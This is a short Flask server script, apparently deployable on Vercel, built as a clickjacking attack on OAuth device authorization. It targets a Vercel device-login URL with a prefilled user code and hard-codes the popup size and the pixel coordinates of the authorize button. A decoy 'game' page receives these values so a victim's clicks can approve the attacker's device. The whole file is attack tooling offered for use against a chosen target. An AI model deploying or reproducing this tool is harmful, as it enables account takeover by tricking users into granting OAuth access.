#!/usr/bin/env python3
"""Flask app — local dev server *and* Vercel serverless handler."""

from flask import Flask, redirect, render_template, url_for, request
import os

# ---------------------------------------------------------------------------
# Configuration — edit these for your target
# ---------------------------------------------------------------------------

# Target OAuth device-authorization URL (set in Vercel env vars or edit here)
TARGET_URL = os.environ.get(
    "TARGET_URL",
    "https://vercel.com/oauth/device?user_code=WFJZ-LHRD"
)

POPUP_SIZE = [497, 714]                       # [width, height] of the popup
BUTTON_OFFSET = {"pos": [199, 432], "size": [81, 48]}  # button position & size
USE_HISTORY_BACK = False                      # False = reload URL; True = history.back()

# ---------------------------------------------------------------------------

app = Flask(__name__)
app.secret_key = os.urandom(24)

# BUTTON_OFFSET is hard-coded above, so the saved-target fallback is skipped.
# If you prefer to use a CSS selector + saved HTML, set BUTTON_OFFSET = None
# and provide BUTTON_SELECTOR + saved-target files under static/saved-target/.
button = BUTTON_OFFSET


@app.route("/")
def index():
    domain = request.host.split(":")[0]
    return render_template("index.html", domain=domain)


@app.route("/game")
def game():
    return render_template(
        "game.html",
        url=TARGET_URL,
        button=button,
        popup_size=POPUP_SIZE,
        use_history_back=USE_HISTORY_BACK,
    )


@app.route("/clear")
def clear():
    return redirect(url_for("index"))


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=8000)
